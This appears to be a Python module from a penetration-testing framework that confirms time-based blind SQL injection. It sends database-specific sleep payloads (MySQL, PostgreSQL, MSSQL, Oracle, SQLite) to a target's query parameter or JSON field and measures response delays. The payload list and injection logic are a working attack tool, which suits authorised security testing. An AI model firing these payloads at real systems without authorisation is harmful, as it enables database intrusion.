"""
RedTeef — Time-based blind SQL injection confirmation.

Uses statistical timing analysis (SLEEP-based) to confirm blind SQLi
vulnerabilities with jitter compensation.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

from krumpa.core import Finding, Severity, Target
from krumpa.core.http_client import HttpClient

logger = logging.getLogger("krumpa.redteef.blind_sqli")


# ------------------------------------------------------------------
# Payload database — DB-specific sleep functions
# ------------------------------------------------------------------

SLEEP_PAYLOADS: Dict[str, List[Dict[str, str]]] = {
    "mysql": [
        {"payload": "' OR SLEEP({delay})-- -", "label": "MySQL SLEEP (single-quote)"},
        {"payload": '" OR SLEEP({delay})-- -', "label": "MySQL SLEEP (double-quote)"},
        {"payload": "1 OR SLEEP({delay})", "label": "MySQL SLEEP (numeric)"},
        {"payload": "'; SELECT SLEEP({delay});-- -", "label": "MySQL stacked SLEEP"},
    ],
    "postgresql": [
        {"payload": "'; SELECT pg_sleep({delay});-- -", "label": "PostgreSQL pg_sleep"},
        {"payload": "' OR 1=(SELECT 1 FROM pg_sleep({delay}))-- -", "label": "PostgreSQL pg_sleep subquery"},
    ],
    "mssql": [
        {"payload": "'; WAITFOR DELAY '00:00:0{delay}';-- -", "label": "MSSQL WAITFOR"},
        {"payload": "' OR 1=1; WAITFOR DELAY '00:00:0{delay}';-- -", "label": "MSSQL WAITFOR chained"},
    ],
    "oracle": [
        {"payload": "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -", "label": "Oracle DBMS_PIPE"},
    ],
    "sqlite": [
        {"payload": "' OR 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))-- -", "label": "SQLite heavy computation"},
    ],
    "generic": [
        {"payload": "' OR SLEEP({delay})-- -", "label": "Generic SLEEP"},
        {"payload": "'; SELECT SLEEP({delay});-- -", "label": "Generic stacked SLEEP"},
        {"payload": "' OR BENCHMARK(10000000,SHA1('test'))-- -", "label": "MySQL BENCHMARK (no SLEEP)"},
    ],
}


@dataclass
class TimingResult:
    """Result of a single timing measurement."""
    payload: str
    db_type: str
    delay_seconds: float
    measured_seconds: float
    baseline_seconds: float
    is_delayed: bool = False
    confidence: float = 0.0


class BlindSqliConfirmer:
    """
    Confirm blind SQL injection via time-based analysis.

    Strategy:
    1. Measure baseline response time (average of N requests)
    2. Send SLEEP(5) payload and measure
    3. Send SLEEP(0) payload as control
    4. Statistical comparison: if payload time ≈ baseline + delay ± jitter
       → confirmed
    """

    def __init__(
        self,
        *,
        http_client: Optional[HttpClient] = None,
        delay_seconds: float = 5.0,
        baseline_samples: int = 3,
        jitter_tolerance: float = 1.5,
        db_types: Optional[List[str]] = None,
    ) -> None:
        self._client = http_client
        self._owns_client = http_client is None
        self._delay = delay_seconds
        self._baseline_samples = baseline_samples
        self._jitter = jitter_tolerance
        self._db_types = db_types or ["generic", "mysql", "postgresql", "mssql"]

    async def confirm(
        self,
        target: Target,
        *,
        inject_field: str = "",
        finding: Optional[Finding] = None,
    ) -> List[Finding]:
        """Attempt to confirm blind SQLi via timing on *target*."""
        findings: List[Finding] = []
        client = self._get_client()

        try:
            # 1. Baseline timing
            baseline = await self._measure_baseline(client, target)
            logger.info("Baseline timing: %.2fs (avg of %d)", baseline, self._baseline_samples)

            # 2. Test each DB-specific payload set
            for db_type in self._db_types:
                payloads = SLEEP_PAYLOADS.get(db_type, [])
                for payload_spec in payloads:
                    result = await self._test_payload(
                        client, target, payload_spec, db_type, baseline, inject_field,
                    )
                    if result.is_delayed and result.confidence >= 0.7:
                        findings.append(Finding(
                            title=f"Blind SQLi confirmed (time-based, {db_type})",
                            description=(
                                f"Time-based blind SQL injection confirmed on {target.url}. "
                                f"Payload: {result.payload}. Baseline: {baseline:.2f}s, "
                                f"Measured: {result.measured_seconds:.2f}s (expected delay: {self._delay}s). "
                                f"Confidence: {result.confidence:.0%}."
                            ),
                            severity=Severity.CRITICAL,
                            target=target,
                            evidence=(
                                f"DB type: {db_type}\n"
                                f"Payload: {result.payload}\n"
                                f"Baseline: {baseline:.2f}s\n"
                                f"Measured: {result.measured_seconds:.2f}s\n"
                                f"Confidence: {result.confidence:.0%}"
                            ),
                            remediation="Use parameterised queries / prepared statements. Never concatenate user input into SQL.",
                            cwe=89,
                            tags=["sqli", "blind", "time-based", "confirmed", db_type],
                        ))
                        return findings  # first confirmed is sufficient
        finally:
            self._maybe_close(client)

        return findings

    @staticmethod
    def get_payloads(db_type: str = "generic") -> List[Dict[str, str]]:
        return SLEEP_PAYLOADS.get(db_type, SLEEP_PAYLOADS["generic"])

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    async def _measure_baseline(
        self, client: HttpClient, target: Target,
    ) -> float:
        """Average response time over N samples."""
        times: List[float] = []
        for _ in range(self._baseline_samples):
            t0 = time.monotonic()
            try:
                await client.request(target.method, target.url, headers=target.headers)
            except Exception:
                pass
            elapsed = time.monotonic() - t0
            times.append(elapsed)
        return sum(times) / max(len(times), 1)

    async def _test_payload(
        self,
        client: HttpClient,
        target: Target,
        payload_spec: Dict[str, str],
        db_type: str,
        baseline: float,
        inject_field: str,
    ) -> TimingResult:
        """Send a timing payload and measure the response."""
        payload_str = payload_spec["payload"].replace("{delay}", str(int(self._delay)))

        # Build request with injected payload
        url = target.url
        headers = dict(target.headers or {})

        if inject_field:
            # Inject into a specific field in the body
            import json
            body = {}
            if target.body:
                try:
                    body = json.loads(target.body)
                except (json.JSONDecodeError, TypeError):
                    body = {}
            body[inject_field] = payload_str
            t0 = time.monotonic()
            try:
                await client.request(
                    target.method or "POST", url,
                    json_body=body, headers=headers,
                )
            except Exception:
                pass
            elapsed = time.monotonic() - t0
        else:
            # Inject into URL query parameter
            sep = "&" if "?" in url else "?"
            inject_url = f"{url}{sep}id={payload_str}"
            t0 = time.monotonic()
            try:
                await client.request(target.method, inject_url, headers=headers)
            except Exception:
                pass
            elapsed = time.monotonic() - t0

        # Calculate confidence
        expected = baseline + self._delay
        diff = abs(elapsed - expected)
        is_delayed = elapsed >= (baseline + self._delay - self._jitter)

        if is_delayed:
            confidence = max(0.0, 1.0 - (diff / self._delay))
        else:
            confidence = 0.0

        return TimingResult(
            payload=payload_str,
            db_type=db_type,
            delay_seconds=self._delay,
            measured_seconds=elapsed,
            baseline_seconds=baseline,
            is_delayed=is_delayed,
            confidence=confidence,
        )

    def _get_client(self) -> HttpClient:
        return self._client or HttpClient(timeout=30.0, retries=0)

    def _maybe_close(self, client: HttpClient) -> None:
        pass
